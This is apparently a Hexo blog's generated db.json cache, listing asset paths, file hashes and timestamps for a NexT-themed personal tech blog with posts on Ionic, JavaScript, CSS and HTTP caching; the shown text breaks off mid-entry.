{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"source/CNAME","path":"CNAME","modified":0,"renderable":0},{"_id":"themes/next/source/baidu_verify_D2cu62kugB.html","path":"baidu_verify_D2cu62kugB.html","modified":0,"renderable":1},{"_id":"themes/next/source/google0a4d6890c1645c94.html","path":"google0a4d6890c1645c94.html","modified":0,"renderable":1},{"_id":"themes/next/source/css/main.styl","path":"css/main.styl","modified":0,"renderable":1},{"_id":"themes/next/source/images/avatar.gif","path":"images/avatar.gif","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-nc-nd.svg","path":"images/cc-by-nc-nd.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-nc-sa.svg","path":"images/cc-by-nc-sa.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-nc.svg","path":"images/cc-by-nc.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-nd.svg","path":"images/cc-by-nd.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by.svg","path":"images/cc-by.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-sa.svg","path":"images/cc-by-sa.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/loading.gif","path":"images/loading.gif","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-zero.svg","path":"images/cc-zero.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/placeholder.gif","path":"images/placeholder.gif","modified":0,"renderable":1},{"_id":"themes/next/source/images/quote-l.svg","path":"images/quote-l.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/quote-r.svg","path":"images/quote-r.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/searchicon.png","path":"images/searchicon.png","modified":0,"renderable":1},{"_id":"themes/next/source/images/1.jpg","path":"images/1.jpg","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/affix.js","path":"js/src/affix.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/bootstrap.js","path":"js/src/bootstrap.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/hook-duoshuo.js","path":"js/src/hook-duoshuo.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/motion.js","path":"js/src/motion.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/post-details.js","path":"js/src/post-details.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/scrollspy.js","path":"js/src/scrollspy.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/utils.js","path":"js/src/utils.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fastclick/LICENSE","path":"vendors/fastclick/LICENSE","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fastclick/bower.json","path":"vendors/fastclick/bower.json","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fastclick/README.md","path":"vendors/fastclick/README.md","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/HELP-US-OUT.txt","path":"vendors/font-awesome/HELP-US-OUT.txt","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/bower.json","path":"vendors/font-awesome/bower.json","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/jquery_lazyload/CONTRIBUTING.md","path":"vendors/jquery_lazyload/CONTRIBUTING.md","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/jquery_lazyload/README.md","path":"vendors/jquery_lazyload/README.md","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/jquery_lazyload/bower.json","path":"vendors/jquery_lazyload/bower.json","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/jquery_lazyload/jquery.lazyload.js","path":"vendors/jquery_lazyload/jquery.lazyload.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/jquery_lazyload/jquery.scrollstop.js","path":"vendors/jquery_lazyload/jquery.scrollstop.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/velocity/bower.json","path":"vendors/velocity/bower.json","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/velocity/velocity.min.js","path":"vendors/velocity/velocity.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/velocity/velocity.ui.js","path":"vendors/velocity/velocity.ui.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/velocity/velocity.ui.min.js","path":"vendors/velocity/velocity.ui.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/jquery/index.js","path":"vendors/jquery/index.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/blank.gif","path":"vendors/fancybox/source/blank.gif","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/fancybox_overlay.png","path":"vendors/fancybox/source/fancybox_overlay.png","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/fancybox_loading.gif","path":"vendors/fancybox/source/fancybox_loading.gif","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/fancybox_loading@2x.gif","path":"vendors/fancybox/source/fancybox_loading@2x.gif","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/fancybox_sprite.png","path":"vendors/fancybox/source/fancybox_sprite.png","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/fancybox_sprite@2x.png","path":"vendors/fancybox/source/fancybox_sprite@2x.png","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/jquery.fancybox.css","path":"vendors/fancybox/source/jquery.fancybox.css","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/jquery.fancybox.pack.js","path":"vendors/fancybox/source/jquery.fancybox.pack.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/jquery.fancybox.js","path":"vendors/fancybox/source/jquery.fancybox.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/schemes/pisces.js","path":"js/src/schemes/pisces.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fastclick/lib/fastclick.min.js","path":"vendors/fastclick/lib/fastclick.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fastclick/lib/fastclick.js","path":"vendors/fastclick/lib/fastclick.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/css/font-awesome.css.map","path":"vendors/font-awesome/css/font-awesome.css.map","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/css/font-awesome.css","path":"vendors/font-awesome/css/font-awesome.css","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/css/font-awesome.min.css","path":"vendors/font-awesome/css/font-awesome.min.css","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/fonts/fontawesome-webfont.woff2","path":"vendors/font-awesome/fonts/fontawesome-webfont.woff2","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/ua-parser-js/dist/ua-parser.min.js","path":"vendors/ua-parser-js/dist/ua-parser.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/ua-parser-js/dist/ua-parser.pack.js","path":"vendors/ua-parser-js/dist/ua-parser.pack.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/fonts/FontAwesome.otf","path":"vendors/font-awesome/fonts/FontAwesome.otf","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/fonts/fontawesome-webfont.eot","path":"vendors/font-awesome/fonts/fontawesome-webfont.eot","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/fonts/fontawesome-webfont.woff","path":"vendors/font-awesome/fonts/fontawesome-webfont.woff","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/velocity/velocity.js","path":"vendors/velocity/velocity.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/helpers/jquery.fancybox-buttons.css","path":"vendors/fancybox/source/helpers/jquery.fancybox-buttons.css","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/helpers/fancybox_buttons.png","path":"vendors/fancybox/source/helpers/fancybox_buttons.png","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/helpers/jquery.fancybox-buttons.js","path":"vendors/fancybox/source/helpers/jquery.fancybox-buttons.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/helpers/jquery.fancybox-media.js","path":"vendors/fancybox/source/helpers/jquery.fancybox-media.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/helpers/jquery.fancybox-thumbs.css","path":"vendors/fancybox/source/helpers/jquery.fancybox-thumbs.css","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/fancybox/source/helpers/jquery.fancybox-thumbs.js","path":"vendors/fancybox/source/helpers/jquery.fancybox-thumbs.js","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/fonts/fontawesome-webfont.ttf","path":"vendors/font-awesome/fonts/fontawesome-webfont.ttf","modified":0,"renderable":1},{"_id":"themes/next/source/vendors/font-awesome/fonts/fontawesome-webfont.svg","path":"vendors/font-awesome/fonts/fontawesome-webfont.svg","modified":0,"renderable":1}],"Cache":[{"_id":"source/CNAME","hash":"71a73063bb00b58fbab36af21b42dae6a4d27921","modified":1525688999523},{"_id":"themes/next/.gitignore","hash":"63d003fa46cf9665b4dab1786f9dc694812a5a79","modified":1525688999735},{"_id":"themes/next/.bowerrc","hash":"20038353db532b4c40625419d396da7359f89cbe","modified":1525688999732},{"_id":"themes/next/.editorconfig","hash":"211d2c92bfdddb3e81ea946f4ca7a539f150f4da","modified":1525688999732},{"_id":"themes/next/.hound.yml","hash":"289dcf5bfe92dbd680d54d6e0668f41c9c9c0c78","modified":1525688999736},{"_id":"themes/next/.javascript_ignore","hash":"beb0b95736650284ceb712a162cc033847a83cd3","modified":1525688999736},{"_id":"themes/next/README.en.md","hash":"fa31bbc6dd8778b8dee469740c92b3b5b59702af","modified":1525688999737},{"_id":"themes/next/.jshintrc","hash":"b7d23f2ce8d99fa073f22f9960605f318acd7710","modified":1525688999737},{"_id":"themes/next/README.md","hash":"06aaf1241e9e1619956c86d8b1397a643840a9d1","modified":1525688999738},{"_id":"themes/next/_config.yml","hash":"55152d25ace42e3e0fac1720af296d2bf335caf9","modified":1525688999739},{"_id":"themes/next/bower.json","hash":"da39b00fcdf2e7a42af412de0a4d3617cc6d7084","modified":1525688999739},{"_id":"themes/next/gulpfile.coffee","hash":"4e8c1082fa82e383494ff5b5963b7936d9c7bb2e","modified":1525688999740},{"_id":"themes/next/package.json","hash":"95eaba1607544965e432d56406bae391dd11bcbb","modified":1525688999785},{"_id":"source/_posts/A_Hiccup_When_ion-view_And_ng-repeat_Meet_With_$watch.md","hash":"93bdf17ba5d08961957af7016aa2330ee197016a","modified":1525688999524},{"_id":"source/_posts/Ionic_AngularJS_Cordova_Hybrid_APP_Developing_Environment_And_Build.md","hash":"126775897160456eff717c37bbfde990d28b599a","modified":1525688999526},{"_id":"source/_posts/A_Note_About_Developing_A_Hybrid_APP_Which_Supports_for_offline_Take_Photo_And_Uploading_Pictures.md","hash":"7a1daf45978bc145bb0c3afd53d326c06b224211","modified":1525688999525},{"_id":"source/_posts/HTTP_cache.md","hash":"555fbe5b70264dbd272ce96870a8483c4bbf5f1e","modified":1533353813246},{"_id":"source/_posts/Question_About_Onunload.md","hash":"cf8bd14c471b7f3aa98e203a4176a366fc6fbf7e","modified":1525688999528},{"_id":"source/_posts/Obstacles_I_Met_When_Using_Hexo.md","hash":"cf042d2893b71c089f6e1630ecaa60d48c67c63c","modified":1525688999527},{"_id":"source/_posts/Obstacles_I_Met_When_Using_MongoDB.md","hash":"ba4b35bbcbf086d40d7e842df29e7b8c894a1c85","modified":1525688999527},{"_id":"source/_posts/TCP-IP.md","hash":"1b3bfd2c42703c3a300d33019cfb812341edead6","modified":1533355004739},{"_id":"source/_posts/_aa_title_reflect_link.txt","hash":"45bd1955d27fd4ff00c126219ba692e849ef32fb","modified":1525688999529},{"_id":"source/_posts/_javascript-closure.md","hash":"78d27c89cc06a090720416995c5e1b9c20b398fa","modified":1525688999530},{"_id":"source/_posts/_interview-questions.md","hash":"d64ec969263ebd5431dc492edf28838706ceb5a9","modified":1525688999530},{"_id":"source/_posts/_the-book-professional-javascript-make-your-eyes-open.md","hash":"dd078ea620643fc622f8d16f34c2fd84ae421f71","modified":1525688999531},{"_id":"source/_posts/developing-a-simple-web-server-with-node-js.md","hash":"89c33efd6aa190cc74672b2d79b5699d0c1d5593","modified":1525688999531},{"_id":"source/_posts/knowledge-about-encoding-and-transcoding.md","hash":"3dd703a2d41ba6432d728f6f8f1afe789eb19e14","modified":1525688999567},{"_id":"source/_posts/npm ERR! shasum check failed for.md","hash":"07417087353427ca10d7b0d76cbbae847e87ac50","modified":1525688999568},{"_id":"source/_posts/read-book-professional-javascript1.md","hash":"810772653301a5f0a4febfb504492e68ea401b11","modified":1525688999599},{"_id":"source/_posts/read-book-professional-javascript2.md","hash":"e536e5977d2d1acbc0cba629df2b3676bf85805a","modified":1525688999600},{"_id":"source/_posts/read-book-professional-javascript3.md","hash":"e076f49e0372934296193919c39fad5b42c98729","modified":1525688999600},{"_id":"source/_posts/read-book-professional-javascript4.md","hash":"ee469c8b59bc944aa735be706dc23e4c9b964248","modified":1525688999601},{"_id":"source/_posts/read-book-professional-javascript5.md","hash":"b7fcee316d00226dc8568ee9e1fdf9c818d6405b","modified":1525688999602},{"_id":"source/_posts/storage-in-frontent.md","hash":"ae5ee002142ddcea89c862deff4654f6a0e0241f","modified":1533355989576},{"_id":"source/_posts/summary-of-aligning-to-center-solutions-in-css.md","hash":"192d43287673c195b857246ccf18444e97d2e39e","modified":1525688999604},{"_id":"source/about/index.md","hash":"10716337774f8fa9ebbbeab10860f94694424d58","modified":1525688999604},{"_id":"source/categories/index.md","hash":"a0891813b8932f7d3c06df63386941f6cce8bb3e","modified":1525688999605},{"_id":"source/tags/index.md","hash":"914fc5ee48f033191d991e352cbd658fc5148ef9","modified":1525688999605},{"_id":"themes/next/.github/CONTRIBUTING.md","hash":"4312fb37fa2b8663006be3c4fe01125ec01171c1","modified":1525688999734},{"_id":"themes/next/.github/ISSUE_TEMPLATE.md","hash":"2692e36cc35b1594530981e7727771f601720a43","modified":1525688999734},{"_id":"themes/next/languages/de.yml","hash":"4c3ffeb0d214c807a226dd98214958cb5483df1c","modified":1525688999740},{"_id":"themes/next/languages/id.yml","hash":"19537c8bae42c4c2e7d06a64537e8dfd503b7e19","modified":1525688999742},{"_id":"themes/next/languages/fr-FR.yml","hash":"d8a40fe025fad6f42df0cf16d4be2d513769b062","modified":1525688999742},{"_id":"themes/next/languages/ja.yml","hash":"e594aa42a33c489e4a65065659a01bb76c3c0cb5","modified":1525688999743},{"_id":"themes/next/languages/ru.yml","hash":"c3aedb94decf05a301662afc3398ab563dd9995a","modified":1525688999745},{"_id":"themes/next/languages/pt.yml","hash":"4c64594f477905d5d2d9ca2422f03175b7b0c617","modified":1525688999744},{"_id":"themes/next/languages/zh-hk.yml","hash":"88e603eb0f3fd25c35bb37bd30372fd77bba7c46","modified":1525688999746},{"_id":"themes/next/languages/pt-BR.yml","hash":"81498b783372f11b2149bd2b1731e78432760a0e","modified":1525688999744},{"_id":"themes/next/languages/zh-tw.yml","hash":"04479b419c72b71fd34046f3fc33ebda4fe8de84","modified":1525688999746},{"_id":"themes/next/layout/_layout.swig","hash":"1138b849e1240249480849cc2b6c6d09b28207a5","modified":1525688999747},{"_id":"themes/next/languages/zh-Hans.yml","hash":"23b45e77c1846c9457b98c745a60a9461678c389","modified":1525688999745},{"_id":"themes/next/layout/archive.swig","hash":"b867a08f6b43de8b5d700c84b943df55917407ae","modified":1525688999781},{"_id":"themes/next/layout/category.swig","hash":"58cf08388901f7549b1fca95548b2c79173aa840","modified":1525688999782},{"_id":"themes/next/layout/page.swig","hash":"a91e3fd7aef26e8a02e339e3372801c517f400cf","modified":1525688999783},{"_id":"themes/next/layout/index.swig","hash":"e5b52e04296203262a400e8e36ae12426d31fd5b","modified":1525688999783},{"_id":"themes/next/languages/en.yml","hash":"df81ab6b1cf3c88ed053d3766381cd12eb659fe3","modified":1525688999741},{"_id":"themes/next/layout/post.swig","hash":"b8334c479840b7724638eec71971cbd8512ae58d","modified":1525688999784},{"_id":"themes/next/layout/tag.swig","hash":"6f764ea3ab11eeb7c530df45528d449b14f5dc62","modified":1525688999784},{"_id":"themes/next/scripts/merge-configs.js","hash":"f8cde6953939802f92da5b7a2458c6c539e9be69","modified":1525688999786},{"_id":"themes/next/languages/default.yml","hash":"d2f6784b9c6567b64e58736e36025dbf96d863d4","modified":1525688999741},{"_id":"themes/next/source/baidu_verify_D2cu62kugB.html","hash":"ce3a901d2a36f2dba0664e8bc7aea0052e659c34","modified":1525688999788},{"_id":"themes/next/source/google0a4d6890c1645c94.html","hash":"264f88c54ac21f11e0a813dca4a70caba0c6ff8c","modified":1525688999841},{"_id":"themes/next/test/helpers.js","hash":"f25e7f3265eb5a6e1ccbb5e5012fa9bebf134105","modified":1525688999890},{"_id":"themes/next/test/.jshintrc","hash":"1dae9d1cf7df1ae6d5c5efd6cffb949e9b8dcebb","modified":1525688999890},{"_id":"themes/next/test/intern.js","hash":"db90b1063356727d72be0d77054fdc32fa882a66","modified":1525688999891},{"_id":"themes/next/source/fonts/.gitkeep","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1525688999841},{"_id":"source/_posts/ionic/10.jpg","hash":"ae29825c6d5d8c022f5b0f24f3c35a14f3b8e8c9","modified":1525688999535},{"_id":"source/_posts/ionic/11.jpg","hash":"28a312c39c844bde6db5d17e9ff6f0e0abb46b43","modified":1525688999536},{"_id":"source/_posts/ionic/16.jpg","hash":"88116dd9359b1e06dca75748ec5fe84095172cf5","modified":1525688999546},{"_id":"source/_posts/ionic/17.jpg","hash":"fd11d295175c870ac621c345b6d316aa7c17c9a4","modified":1525688999547},{"_id":"source/_posts/ionic/18.jpg","hash":"21e77717bdd92e5359bf3a698194390cd6485e3f","modified":1525688999548},{"_id":"source/_posts/ionic/6.jpg","hash":"bc91ce2287f791f6aa88f590fa69b0ef6f08ae5f","modified":1525688999558},{"_id":"source/_posts/ionic/commands.txt","hash":"5b0e642720f2f05af0e8ae30a731134c543cff9f","modified":1525688999564},{"_id":"source/_posts/ionic_hybrid/_支持离线和拍照上传的Hybrid APP开发小记____整理.docx","hash":"7c42a74a2c6490bcbf0ca2e6a4d5bc2bee15a298","modified":1525688999565},{"_id":"source/_posts/ionic/9.jpg","hash":"a74b42290787d3f20b9e3681ce4a0982b0f98139","modified":1525688999563},{"_id":"source/_posts/ionic_hybrid/_汇总向↗CSS居中需求和方案总结.docx","hash":"7c42a74a2c6490bcbf0ca2e6a4d5bc2bee15a298","modified":1525688999566},{"_id":"source/_posts/ionic_hybrid/heightWrong.jpg","hash":"0d4c3d96a923b21e9fa8b1f2a07ebaa794b92f02","modified":1525688999567},{"_id":"source/_posts/pic/Dimensions-client.png","hash":"6a327f054ca1529b7917ee1c0821cc53c89b0af9","modified":1525688999569},{"_id":"source/_posts/pic/Dimensions-offset.png","hash":"2fa1d2d585aba373efd92039d738b777f4cb98ec","modified":1525688999570},{"_id":"source/_posts/pic/Dimensions-scroll.png","hash":"4887c240a7c9a6d845c09072c31d0749af0e2da6","modified":1525688999570},{"_id":"source/_posts/pic/hexo_qiniu.png","hash":"3e98ca7c15c102b21bad19e4e8495dccf0255ed0","modified":1525688999578},{"_id":"source/_posts/pic/copy-variable.png","hash":"ef7fe857539bb6f5709789b876d4daed665c0c62","modified":1525688999577},{"_id":"source/_posts/pic/identifier.png","hash":"758a09db27f1ac43d19badabb94572c700dd06cb","modified":1525688999578},{"_id":"source/_posts/pic/stack.png","hash":"788168262cd17ffb948f6e0e9ae69b4a62bf2de1","modified":1525688999585},{"_id":"source/_posts/pic/setdomain.png","hash":"3b6e90871d67bb6fba1d4e4522f1f5cfd2abd9a7","modified":1525688999584},{"_id":"source/_posts/pic/var.png","hash":"73f9bae1c48456a274def9d1385f48bd1b86ca99","modified":1525688999595},{"_id":"themes/next/layout/_macro/post-collapse.swig","hash":"b87a5122dbff1d5fccf8f3d09d1640bd4b01c4a0","modified":1525688999748},{"_id":"themes/next/layout/_macro/post.swig","hash":"843389ec3cb4c2baa6a6a2bb916f803c89ca723b","modified":1525688999748},{"_id":"themes/next/layout/_macro/sidebar.swig","hash":"9fc9f89c169439d7584197930359b758eb198a1c","modified":1525688999749},{"_id":"themes/next/layout/_macro/reward.swig","hash":"b6cb171f0ed227b82b8f7601814af2df93f3a09a","modified":1525688999749},{"_id":"themes/next/layout/_macro/wechat-subscriber.swig","hash":"d569af20d20a960d534a5b60f90c20fef519d351","modified":1525688999750},{"_id":"themes/next/layout/_partials/footer.swig","hash":"27669118b957e8a39d843b63dddf561c9d62b336","modified":1525688999751},{"_id":"themes/next/layout/_partials/duoshuo-hot-articles.swig","hash":"ba75672183d94f1de7c8bd0eeee497a58c70e889","modified":1525688999751},{"_id":"themes/next/layout/_partials/comments.swig","hash":"5d84f3938e99f1908a6a1d44dd530740625f0188","modified":1525688999750},{"_id":"themes/next/layout/_partials/head.swig","hash":"881abebed3a7fa71827365b0ba0e84ec525eeb7f","modified":1525688999752},{"_id":"themes/next/layout/_partials/pagination.swig","hash":"1634fb887842698e01ff6e632597fe03c75d2d01","modified":1525688999755},{"_id":"themes/next/layout/_partials/header.swig","hash":"bd3fe67a4d0be7036a28b899e0ab67ac179d4e46","modified":1525688999755},{"_id":"themes/next/layout/_partials/search.swig","hash":"95b55fe35f2d2c22f2cc055d4379b5435314c7ec","modified":1525688999756},{"_id":"themes/next/layout/_scripts/baidu-push.swig","hash":"c5db707b46eac6a5df1d2a77f8556945a66fd181","modified":1525688999760},{"_id":"themes/next/layout/_scripts/boostrap.swig","hash":"c0f5a0955f69ca4ed9ee64a2d5f8aa75064935ad","modified":1525688999760},{"_id":"themes/next/layout/_scripts/commons.swig","hash":"931808ad9b8d8390c0dcf9bdeb0954eeb9185d68","modified":1525688999761},{"_id":"themes/next/layout/_scripts/vendors.swig","hash":"c9d45628330ce8bf5fbe71c9f131c7d75334c1c4","modified":1525688999781},{"_id":"themes/next/scripts/tags/group-pictures.js","hash":"ac681b0d0d8d39ba3817336c0270c6787c2b6b70","modified":1525688999788},{"_id":"themes/next/scripts/tags/center-quote.js","hash":"99b66949f18398689b904907af23c013be1b978f","modified":1525688999787},{"_id":"themes/next/scripts/tags/full-image.js","hash":"86194a05a8c6499de0b2aaa525d6de135778c0ae","modified":1525688999787},{"_id":"themes/next/source/css/main.styl","hash":"a91dbb7ef799f0a171b5e726c801139efe545176","modified":1525688999841},{"_id":"themes/next/source/images/avatar.gif","hash":"264082bb3a1af70d5499c7d22b0902cb454b6d12","modified":1525688999843},{"_id":"themes/next/source/images/cc-by-nc-nd.svg","hash":"bc3588c9b2d7c68830524783120ff6cf957cf668","modified":1525688999843},{"_id":"themes/next/source/images/cc-by-nc-sa.svg","hash":"6f55543d1fb9cbc436c101d24f802dec7b41efc3","modified":1525688999843},{"_id":"themes/next/source/images/cc-by-nc.svg","hash":"6f076713fb9bf934aa2c1046bdf2cf2e37bc1eab","modified":1525688999844},{"_id":"themes/next/source/images/cc-by-nd.svg","hash":"42cd73da328077ccc92f859bb8f3cf621b3484f8","modified":1525688999844},{"_id":"themes/next/source/images/cc-by.svg","hash":"e92a33c32d1dac8ed94849b2b4e6456e887efe70","modified":1525688999845},{"_id":"themes/next/source/images/cc-by-sa.svg","hash":"70c1535f43e54e5ff35ca81419e77e4c0c301398","modified":1525688999845},{"_id":"themes/next/source/images/loading.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1525688999846},{"_id":"themes/next/source/images/cc-zero.svg","hash":"9bfb52b2f63527a7049247bf00d44e6dc1170e7d","modified":1525688999845},{"_id":"themes/next/source/images/placeholder.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1525688999846},{"_id":"themes/next/source/images/quote-l.svg","hash":"cd108d6f44351cadf8e6742565217f88818a0458","modified":1525688999846},{"_id":"themes/next/source/images/quote-r.svg","hash":"2a2a250b32a87c69dcc1b1976c74b747bedbfb41","modified":1525688999847},{"_id":"themes/next/source/images/searchicon.png","hash":"67727a6a969be0b2659b908518fa6706eed307b8","modified":1525688999847},{"_id":"source/_posts/ionic/19.png","hash":"8a4a469280b2daed08ff26b56a2733fe2c8fc3ee","modified":1525688999549},{"_id":"source/_posts/ionic/4.jpg","hash":"5b5277712b7c6e69117056b5821b9386145d6ff4","modified":1525688999554},{"_id":"source/_posts/ionic/7.jpg","hash":"cda3af58f6a68d17d89f25352f20ba3a0fb58688","modified":1525688999560},{"_id":"source/_posts/pic/jquery_window_width.png","hash":"0e1f4e64adacbd6fac18ea03b38981f6ba508f0c","modified":1525688999580},{"_id":"source/_posts/pic/window.png","hash":"c956efb50965572f68c6108a9c4ce2e0ce411d2c","modified":1525688999597},{"_id":"source/_posts/pic/window_innerW.png","hash":"92c6f7e7ff352968f1c27146e58abc8e554f8bca","modified":1525688999598},{"_id":"themes/next/layout/_scripts/schemes/mist.swig","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1525688999771},{"_id":"themes/next/layout/_scripts/schemes/muse.swig","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1525688999771},{"_id":"themes/next/source/css/_mixins/Mist.styl","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1525688999822},{"_id":"themes/next/source/css/_mixins/Muse.styl","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1525688999823},{"_id":"themes/next/source/css/_mixins/custom.styl","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1525688999824},{"_id":"themes/next/source/css/_variables/Muse.styl","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1525688999839},{"_id":"themes/next/source/images/1.jpg","hash":"c2cee17605904e834b37a0d2f5157ecbe66bab4d","modified":1525688999842},{"_id":"source/_posts/ionic/13.jpg","hash":"b5f1940809b0262d2d96cab24d75491300eba89c","modified":1525688999541},{"_id":"source/_posts/ionic/15.jpg","hash":"5aaac64f510de15102f117959e4ea36925046205","modified":1525688999545},{"_id":"source/_posts/ionic/2.jpg","hash":"de6257e42bca29d40dac02f94e8ebcbab090180f","modified":1525688999551},{"_id":"source/_posts/ionic/3.jpg","hash":"ec4eb54909a36cc2f82c3436db60a4acf4204acc","modified":1525688999553},{"_id":"source/_posts/ionic/5.jpg","hash":"7e57a19fcca1edc4bfcd4ce2c747e0babea257a3","modified":1525688999556},{"_id":"source/_posts/ionic/8.jpg","hash":"b3e69e6b1fca339e62dd7ae10dfb3d5e9811daac","modified":1525688999562},{"_id":"source/_posts/pic/align/4.png","hash":"524c89c6771758e3c4b2c8d820a2ed11a5ae4c9b","modified":1525688999573},{"_id":"source/_posts/pic/align/1.png","hash":"e2f0f8f35af35448a7225b673df4c63fd65175d4","modified":1525688999571},{"_id":"source/_posts/pic/align/2.png","hash":"6aae2a93f73c6af586c78a07239997c415269701","modified":1525688999571},{"_id":"source/_posts/pic/align/3.png","hash":"7bcb95e3cfa65617d8edad582ad206f73e714742","modified":1525688999572},{"_id":"source/_posts/pic/align/5.png","hash":"63397d82a80cfbf1f08b050f7948f65f2fa308cc","modified":1525688999573},{"_id":"source/_posts/pic/align/7.png","hash":"61d4a539777d23ed616df8a148e5b1c719ef85ad","modified":1525688999574},{"_id":"source/_posts/pic/align/6.png","hash":"23d83c13d96c34fb64a32547a9d2e00ffcf2af3b","modified":1525688999574},{"_id":"source/_posts/pic/storage_in_frontend/storage_in_frontend_0.png","hash":"237e25accf87a0c2cbbd1deae51ec835106b04fb","modified":1525688999586},{"_id":"source/_posts/pic/storage_in_frontend/storage_in_frontend_4.png","hash":"9fddc54a1d0ca062898319c23c583a831d366d45","modified":1525688999593},{"_id":"source/_posts/pic/storage_in_frontend/storage_in_frontend_5.png","hash":"97dba3ff2d08bc5fd5840934693fd28b8fbb461b","modified":1525688999594},{"_id":"source/_posts/pic/storage_in_frontend/storage_in_frontend_6.png","hash":"a5b3301717298831740cf5e5245a49a43d46b23e","modified":1525688999595},{"_id":"themes/next/layout/_partials/head/external-fonts.swig","hash":"f5e487b0d213ca0bd94aa30bc23b240d65081627","modified":1525688999752},{"_id":"themes/next/layout/_partials/search/localsearch.swig","hash":"efa7efcbb575381b508f9aa0e0c53140eef72a7b","modified":1525688999756},{"_id":"themes/next/layout/_partials/search/swiftype.swig","hash":"a8c7f9ca7c605d039a1f3bf4e4d3183700a3dd62","modified":1525688999757},{"_id":"themes/next/layout/_partials/search/tinysou.swig","hash":"b25002a83cbd2ca0c4a5df87ad5bff26477c0457","modified":1525688999757},{"_id":"themes/next/layout/_partials/share/add-this.swig","hash":"bf8e9223a40748b2e3ef77d753a8e1dbbce8095e","modified":1525688999758},{"_id":"themes/next/layout/_partials/share/baidushare.swig","hash":"3fdde03f45a80f7a85097a40b40358adde618fc7","modified":1525688999758},{"_id":"themes/next/layout/_partials/share/jiathis.swig","hash":"12684840de632eb16e53ffa863166306a756fd4f","modified":1525688999759},{"_id":"themes/next/layout/_partials/share/duoshuo_share.swig","hash":"d4fbffd7fa8f2090eb32a871872665d90a885fac","modified":1525688999759},{"_id":"themes/next/layout/_scripts/pages/post-details.swig","hash":"9b84ab576982b2c3bb0291da49143bc77fba3cc6","modified":1525688999762},{"_id":"themes/next/layout/_scripts/third-party/analytics.swig","hash":"91c5353fcb94cc3b3f265b06ad2341734bc4c826","modified":1525688999772},{"_id":"themes/next/layout/_scripts/schemes/pisces.swig","hash":"a9a3995b9615adfb8d6b127c78c6771627bee19a","modified":1525688999771},{"_id":"themes/next/layout/_scripts/third-party/comments.swig","hash":"8ba01f1ac07fbca62a4b00f5a0a3a506122c1530","m